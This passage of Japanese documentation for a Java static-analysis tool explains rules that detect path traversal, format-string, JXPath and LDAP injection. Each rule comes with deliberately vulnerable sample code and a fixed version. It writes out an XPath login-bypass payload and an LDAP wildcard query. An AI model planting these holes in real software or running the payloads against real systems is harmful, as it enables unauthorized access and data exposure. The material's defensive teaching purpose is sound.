- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
「セキュリティとの関連」セクションを参照してください。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
サーバー上のファイルにユーザー固有のデータ ( ここではユーザーの書いたエッセイ ) を
格納するアプリケーションがあるものとします。
ファイル名にはエッセイの題名が使用されます。

次のコードは、ファイルを作成してエッセイの内容を格納します。

import java.io.FileOutputStream;
import java.io.IOException;
import javax.servlet.http.HttpServletRequest;

public class Example
{
    public void saveStory(HttpServletRequest req)
        throws IOException
    {
        String sStoryName = req.getParameter("story_name");
        String sStoryContents = req.getParameter("story");
        String sFileName = sStoryName;
        FileOutputStream fOut = new FileOutputStream(sFileName); // 違反
        fOut.write(sStoryContents.getBytes());
        fOut.close();
    }
}

この場合、悪意のあるプログラマがエッセイのタイトルとして
c:\\windows\\system.ini を渡し、エッセイの中身として
コンフィギュレーション ファイルの内容を渡した場合、
この“エッセイ”を保存すると、システムの重要なファイルが改竄されて
危険な内容が保存されます。 


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import java.io.FileOutputStream;
import java.io.IOException;
import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    public void saveStory(HttpServletRequest req)
        throws IOException
    {
        String sStoryName = validate(req.getParameter("story_name"));
        String sStoryContents = validate(req.getParameter("story"));
        String sFileName = sStoryName;
        FileOutputStream fOut = new FileOutputStream(sFileName); // 違反ではない
        fOut.write(sStoryContents.getBytes());
        fOut.close();
    }

    public abstract String validate(Object obj);
}

教育とトレーニング

Directory Traversal
Video: <A target="_blank" HREF="https://vimeo.com/303808203">https://vimeo.com/303808203</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_3-Directory-Traversal.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_3-Directory-Traversal.pdf</A>

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/fcbfacc8-9ec6-4e4e-843a-99bcb514f199">https://app.hackedu.com/link/fcbfacc8-9ec6-4e4e-843a-99bcb514f199</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A5-Broken Access Control)
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.8 Improper access control
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/22.html">https://cwe.mitre.org/data/definitions/22.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-434: Unrestricted Upload of File with Dangerous Type
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/434.html">https://cwe.mitre.org/data/definitions/434.html</A>

CWE-829: Inclusion of Functionality from Untrusted Control Sphere
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/829.html">https://cwe.mitre.org/data/definitions/829.html</A>

SEI CERT Oracle Coding Standard for Java
IDS04-J. Safely extract files from ZipInputStream
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream">https://www.securecoding.cert.org/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream</A>

OWASP Code Review Guide 2008 V1.1
Reviewing Code for Cross-site scripting p. 141

Tags: OWASP, PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDINPUT" href="#top">[Top]</a><br/><br/><STRONG>
フォーマット文字列からサニタイズされていないユーザー入力を除外する [BD.SECURITY.TDINPUT]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明
このルールは、汚染されている可能性があるデータが PrintStream クラスの format()
または printf() メソッドに書き込まれている場合に違反をレポートします。

System.out および System.err は PrintStream オブジェクトであり、標準出力および
エラー ストリームに対して PrintStream メソッドを呼び出すことを可能にします。
これらのメソッドを使用することによるリスクは、C または C++ の同様の関数を使用する
場合に比べて高くはありません。標準ライブラリの実装は、変換引数と書式指定子が一致
しなかった場合、例外をスローします。

このルールは、汚染されたデータが以下のメソッドに String として渡されている場合に
違反をレポートします。

java.io.PrintStream 
   * format(String, Object...)
   * format(Locale, String, Object...)
   * printf(String, Object...)
   * printf(Locale, String, Object...)
	 およびサブクラスのすべてのメソッド



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

汚染されたデータが format() または printf() に文字列として渡されると、
情報漏えいにつながったり、サービス拒否攻撃を許す可能性があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
情報の漏えいやサービス拒否攻撃を防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

このサンプルでは、args[0] は汚染されたデータであり、書式文字列に組み込まれます。
args[0] には、クレジット カードの有効期限が格納されているはずですが、%1$tm、%1$te 
または %1$tY という書式指定子が含まれている可能性があります。
このサンプルでは、これらの書式指定子は、それぞれ  05 (May)、23 (day)、および 
1995 (year) を出力します。

import java.util.Calendar;
import java.util.GregorianCalendar;

public class Example
{
    static Calendar c = new GregorianCalendar(1995, GregorianCalendar.MAY, 23);

    public static void main(String[] args)
    {
        System.out.format(args[0] + " did not match! HINT: It was issued on %1$terd of some month", c); // 違反
    }
}
	

</PRE>
<STRONG>
修正
</STRONG>
<PRE>
このサンプルでは、args[0] は汚染されたデータですが、書式文字列に組み込まれません。

import java.util.Calendar;
import java.util.GregorianCalendar;

public class Repair
{
    static Calendar c = new GregorianCalendar(1995, GregorianCalendar.MAY, 23);

    public static void main(String[] args)
    {
        System.out.format("%s did not match! HINT: It was issued on %terd of some month", args[0], c); // 違反ではない
    }
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/fbe18191-5bb5-4a8e-8a11-b72e9533a177">https://app.hackedu.com/link/fbe18191-5bb5-4a8e-8a11-b72e9533a177</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

CWE-134: Use of Externally-Controlled Format String
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/134.html">https://cwe.mitre.org/data/definitions/134.html</A>

SEI CERT Oracle Coding Standard for Java
IDS06-J. Exclude unsanitized user input from format strings
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/IDS06-J.+Exclude+unsanitized+user+input+from+format+strings">https://www.securecoding.cert.org/confluence/display/java/IDS06-J.+Exclude+unsanitized+user+input+from+format+strings</A>

Tags: OWASP, PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDJXPATH" href="#top">[Top]</a><br/><br/><STRONG>
JXPath インジェクションから防御する [BD.SECURITY.TDJXPATH]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

JXpath ( Jakarta XPath ) が作成する XML クエリーに、
エンド ユーザーからのデータを検証せずにそのまま渡している場合、
このルールは違反をレポートします。
機密データが公開される恐れがあります。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

   org.apache.commons.jxpath.CompiledExpression
      * setValue(JXPathContext, Object)
   
   org.apache.commons.jxpath.Container
      * setValue(Object)
   
   org.apache.commons.jxpath.DynamicPropertyHandler
      * getProperty(Object, String)
   
   org.apache.commons.jxpath.Function
      * invoke(ExpressionContext, Object)
   
   org.apache.commons.jxpath.Functions
      * getFunction(String, String, Object[])
   
   org.apache.commons.jxpath.IdentityManager
      * getPointerByID(JXPathContext, String)
   
   org.apache.commons.jxpath.JXPathBeanInfo
         * getPropertyDescriptor(String)
   
      org.apache.commons.jxpath.KeyManager
      * getPointerByKey(JXPathContext, String, String)
   
   org.apache.commons.jxpath.Variables
      * declareVariable(String, Object)
      * undeclareVariable(String)
      * getVariable(String)
   
   org.apache.commons.jxpath.JXPathContext
      * compile(String)
      * createPath(String)
      * createPathAndSetValue(String, Object)
      * getNamespaceURI(String)
      * getPointer(String)
      * getPointerByID(String)
      * getPointerByKey(String)
      * getValue(String)
      * iterate(String)
      * iteratePointers(String)
      * newContext(String)
      * registerNamespace(String, String)
      * removeAll(String)
	  * removePath(String)
      * selectNodes(String)
      * selectSingleNode(String)
      * setValue(String, Object)
   
   org.apache.commons.jxpath.MapDynamicPropertyHandler
      * getProperty(Object, String)
      * getPropertyNames(Object)
      * setProperty(Object, String, Object)
   
   org.apache.commons.jxpath.PackageFunctions
      * getFunction(String, String, Object[])
   
   org.apache.commons.jxpath.ri.NamespaceResolver
      * getNamespaceURI(String)
      * getPrefix(String)
      * registerNamespace(String, String)

   org.apache.commons.jxpath.ri.Parser
      * parseExpression(String, Compiler)
   
   org.apache.commons.jxpath.ri.Compuler
      * all methods



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃


OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #1 「A1 - インジェクション」を推進します。

org.apache.commons.jxpath パッケージは、XPath という言語の式の
単純なインタープリターを定義します。
JXPath は、XPath の式をあらゆる種類のオブジェクトのグラフに適用します。
( たとえば JavaBean、Map、Servlet コンテキスト、DOM など。その混合も含む ) 

次の例を見てみましょう。

Address address = (Address)JXPathContext.newContext(vendor).
         getValue("locations[address/zipCode='90210']/address");

この XPath の式は、次の Java コードに相当します。


Address address = null;
Collection locations = vendor.getLocations();
Iterator it = locations.iterator();
while (it.hasNext()){
    Location location = (Location)it.next();
    String zipCode = location.getAddress().getZipCode();
    if (zipCode.equals("90210")){
      address = location.getAddress();
      break;
    }
}

アプリケーションが実行時に JXPath クエリーを作成していて、
安全ではないユーザー入力をクエリーに埋め込んでいる場合、
悪意のあるプログラマはクエリーにデータを挿入し、
本来の目的とは異なるクエリーをアプリケーションにパースさせることができます。
そのため、オブジェクトの作成や修正、プロパティの変更に使用される JXPath メソッドには、
汚染の可能性があるデータを渡さないようにする必要があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
この Web アプリケーションは、JXPath を使ってデータ コレクションを
クエリーし、クライアントから受け取った名前とパスワードに対応する
ユーザのアカウント番号を取得するものとします。
クライアントからのデータを検証せずにそのまま JXPath クエリーに埋め込む場合、
これはセキュリティ ホールを作成していることになります。 

import java.security.Security;
import javax.servlet.http.HttpServletRequest;
import org.apache.commons.jxpath.JXPathContext;

public class Example
{
    public void example(Security security, HttpServletRequest httpRequest)
        throws Exception
    {
        String sName = httpRequest.getParameter("userName");
        String sPasswd = httpRequest.getParameter("passwd");
        String sAccount = (String)JXPathContext.newContext(security) // 違反
            .getValue("allUsers[userName='" + sName + "' and password='" + sPasswd + "']/account");
        if (sAccount == null) {
            // name and password pair was not found in XML
            // login failer -&gt; relogin
        } else {
            // account found -&gt; Login succeeded.
            // Proceed into the application.
        }
    }
}

悪意のあるプログラマは、XPath の式を挿入できます。たとえば、
ユーザー名として次の値が挿入された場合、

' or 1=1 or ''='

オリジナルの XPath のセマンティクスは変更され、
XML 文書の最初のアカウント番号が常に返されるようになります。
この場合、クエリーは次のようになります。


allUsers[userName='' or 1=1 or ''='' and password='foobar']/account


これは次のコードと同じです。最初のユーザー アカウントのインスタンスを生成します。

Collection allUsers = security.getAllUsers();
Iterator it = allUsers .iterator();
while (it.hasNext()){
   User user = (User)it.next();
   String userName = user.getUserName();
   String password = user.getPassword();
   if ((userName == "") or (1==1) or ('' == '') and (password == "foobar")) {
       return user.getAccount();
   }
}


攻撃者は、有効なユーザー名とパスワードを入力することなく、
XML 文書の 1 番目のユーザーとしてアプリケーションにログインできます。


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import java.security.Security;
import javax.servlet.http.HttpServletRequest;
import org.apache.commons.jxpath.JXPathContext;

public abstract class Repair
{
    public void example(Security security, HttpServletRequest httpRequest)
        throws Exception
    {
        String sName = validate(httpRequest.getParameter("userName"));
        String sPasswd = validate(httpRequest.getParameter("passwd"));
        String sAccount = (String)JXPathContext.newContext(security) // 違反ではない
            .getValue("allUsers[userName='" + sName + "' and password='" + sPasswd + "']/account");
        if (sAccount == null) {
            // name and password pair was not found in XML
            // login failer -&gt; relogin
        } else {
            // account found -&gt; Login succeeded.
            // Proceed into the application.
        }
    }

    public abstract String validate(Object obj);
}

教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/17cd789a-9251-416a-a789-b2eeb841887d">https://app.hackedu.com/link/17cd789a-9251-416a-a789-b2eeb841887d</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/643.html">https://cwe.mitre.org/data/definitions/643.html</A>

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDLDAP" href="#top">[Top]</a><br/><br/><STRONG>
LDAP インジェクションから防御する [BD.SECURITY.TDLDAP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは LDAP インジェクションの可能性を検出します。つまり、
LDAP クエリーを実行するメソッドに、汚染されている可能性があるデータが
渡されるケースを検出します。

ユーザーから提供されるデータや未検証のデータ ソースからのデータを使って
LDAP 検索クエリーを作成するアプリケーションにおいて
使用前にデータを検証していない場合、
悪意のあるプログラマは LDAP ステートメントを改竄して、
LDAP ツリーをクエリー、変更、削除する権限を自分に
与えることができます。これは重大なセキュリティの問題です。

このルールは、汚染されたデータが
次の危険なメソッドに渡されたときに違反をレポートします。


javax.naming.directory.DirContext 
   * search(Name name, String filter, SearchControls? cons) 
   * search(Name name, String filterExpr, Object[] filterArgs, SearchControls? cons)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃


OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #1 「A1 - インジェクション」を推進します。

検証していないデータが LDAP クエリーに渡される場合、
悪意のあるプログラマはデータベースを乗っ取ることができます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
「セキュリティとの関連」セクションを参照してください。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.IOException;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.InitialDirContext;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Example
    extends HttpServlet
{
    InitialDirContext _context;

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws IOException
    {
        String userName = req.getParameter("user");
        String filter = "(uid=" + userName + ")";
        try {
            NamingEnumeration&lt;SearchResult&gt; namingEnum = _context.search(userName, filter, new SearchControls()); // 違反
            while (namingEnum.hasMore()) {
                resp.getWriter().write("User: " + namingEnum.next() + "\n");
                // ...
            }
        } catch (NamingException e) {
            // ...
        }
    }
}

リクエストに次のデータが渡された場合、
"<A target="_blank" HREF="http://somehost/userinfo?user=*">http://somehost/userinfo?user=*</A>"


LDAP の検索フィルタは次のようになります。

(uid=*)

これは LDAP ディレクトリからすべてのユーザー情報を取得します。


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
ユーザーから渡されるすべてのデータを検証して、不正使用の恐れがある
文字や文字列を排除する必要があります。
もっとも良い方法は、正規表現を使ってデータをフィルターすることです。
たとえば、次の正規表現は英数字のみを返します。
 s/[^0-9a-zA-Z]//g

修正後のコードは次のようになります。

import java.io.IOException;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.InitialDirContext;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public abstract class Repair
    extends HttpServlet
{
    InitialDirContext _context;

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws IOException
    {
        String userName = validate(req.getParameter("user"));
        String filter = "(uid=" + userName + ")";
        try {
            NamingEnumeration&lt;SearchResult&gt; namingEnum = _context.search(userName, filter, new SearchControls()); // 違反ではない
            while (namingEnum.hasMore()) {
                resp.getWriter().write("User: " + namingEnum.next() + "\n");
                // ...
            }
        } catch (NamingException e) {
            // ...
        }
    }

    public abstract String validate(Object obj);
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
